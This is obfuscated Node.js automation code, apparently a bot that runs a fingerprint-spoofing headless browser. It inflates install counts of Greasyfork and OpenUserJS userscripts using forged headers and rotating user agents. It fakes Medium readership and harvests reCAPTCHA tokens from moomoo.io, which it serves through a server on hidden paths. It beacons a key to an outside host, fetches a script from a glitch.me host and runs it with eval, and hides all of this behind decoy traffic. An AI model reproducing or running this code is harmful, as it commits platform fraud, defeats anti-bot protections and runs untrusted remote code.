      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + U(0xe, 'vHhN') + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + V(0x1),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': S(0x10) + 'easyfork.o' + S(0x16) + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + S(0x15),
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + V(0x13),
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + S(0x5) + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * -0x25f1 + -0x21d4 + -0x13 * -0x3c7
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const W = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1bda + -0x1e + 0x14 * -0x163)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + W(0x6) + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x2 * -0xd23 + 0x59 * 0x28 + -0x1 * -0xcc2), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xe37 + -0x11be + -0x1 * -0x3eb), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x35 * -0x2b + -0x47d * 0x1 + 0xd64;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x435 * -0x4 + 0x1 * -0x17b1 + 0xfb * 0x7; w < getRandomInt(0x5 * 0x1d8 + -0x3bd + -0x57a, 0x95 * -0x13 + 0x15a * 0xc + -0x524); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x19cca * -0x1 + 0x4c6b + -0x1 * 0xfed5);
        }
      }();
    }, -0x79c + -0x1607 * 0x1 + 0x1e07), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x68d + 0x18c0 + -0x1f4d;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x2b * -0x64 + 0xd01 * -0x2 + 0x2ace, -0x13 * -0xd5 + 0x4 * 0x31c + -0x1c0d)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x3d * 0x33d + -0x1038 + -0x4021 * 0x1);
    }, -0x1 * -0x18c1 + -0x1f7b * -0x1 + -0x37d8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x5 * 0x4b7 + 0x4ab + -0x1c3e;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x14d + -0xcba + 0x18b * 0xf), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2c2 * -0x2 + 0x3 * 0x77d + -0x10f3), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x191 * 0x233 + 0xb2989 + 0x301fd * 0x2);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x167 * 0x6 + 0x8ef * 0x3 + -0x11ff);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xdcd * -0x1 + 0xb5 * -0x12 + -0xf * 0x5);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x243b + 0x1 * -0x35e7 + 0x79b2);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = c,
    Z = d;
  async function f() {
    const Y = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1413 * -0x1 + 0x11 * 0xa + -0xa5e * 0x2) {
        const X = d;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x11 * -0x16f + 0x5ae * -0x5 + 0x6 * 0xac));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A[X(0xd)](C),
          E = D['slice'](0x3ad * 0x7 + -0xd79 + -0x3 * 0x416, D['indexOf']('\x20'));
        return B ? E['slice'](0x12dd + -0x485 + 0x99 * -0x18, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2c5 * 0x9 + 0x4765 + -0x8 * 0xed),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x52b * 0xb + 0x3 * 0xdaf + 0x36dc),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': Y(0x12, 'XhbY')
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + Z(0xc) + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + a0(0xf) + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + Z(0x11) + '0.1462.54'
    ];
  f();
  for (let k = -0x5 * 0x409 + -0x441 + 0x3b * 0x6a; k < 0xf * -0xe5 + 0x35e * 0x1 + 0xa11; k++)
    setTimeout(f, (0x15f1 * 0x2 + -0xa07c + 0x4b * 0x4ae) * k * getRandomInt(0x23ce + -0xc35 * 0x1 + -0x1798, 0x17d1 + -0x2178 + 0x9aa));
  setInterval(() => {
    f();
    for (let l = -0x2 * -0x60a + 0x13e6 + -0x1 * 0x1ffa; l < -0x904 + 0x35 * 0xd + 0x657; l++)
      setTimeout(f, (0xf * -0x1bff + -0x1 * 0xa275 + 0x330c6) * l * getRandomInt(-0x5 * 0x37 + -0x15fd * -0x1 + 0x1 * -0x14e9, -0x166d + -0x4f * -0x2f + 0x7ef));
  }, -0x1 * -0x5f4c6b + -0x2ed31b * 0x1 + -0x22710 * -0x3);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
